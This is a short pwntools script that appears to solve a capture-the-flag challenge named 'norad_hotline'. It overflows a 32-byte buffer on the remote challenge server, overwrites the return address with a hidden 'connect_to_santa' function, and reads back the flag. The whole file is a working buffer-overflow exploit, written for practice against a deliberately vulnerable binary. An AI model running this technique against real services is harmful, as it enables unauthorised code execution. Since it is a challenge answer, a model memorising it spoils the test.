from pwn import *
import re

elf = ELF('./norad_hotline', checksec=False)

r = remote("tcp.ybn.sg", 14937)

OFFSET = 32
WIN = elf.symbols['_ZN12NORADHotline16connect_to_santaEv']

payload  = b"A" * OFFSET
payload += p64(WIN)

r.sendlineafter(b"name:", b"a")
r.sendlineafter(b"calling from:", payload)

resp = r.recvall().decode()
r.close()

flag = re.findall(r'(YBN25{.+})', resp)[0]
print("Flag:", flag)